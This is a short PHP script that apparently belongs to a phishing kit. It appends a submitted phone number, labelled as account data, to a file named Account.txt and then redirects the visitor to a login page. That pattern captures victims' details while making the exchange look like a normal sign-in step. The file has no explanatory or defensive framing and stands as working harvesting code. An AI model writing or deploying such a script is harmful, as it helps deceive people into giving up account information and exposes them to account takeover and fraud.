<?php
file_put_contents("Account.txt", "Phone => " . $_POST["phone_number"],FILE_APPEND);
header("Location: login.html");
?>
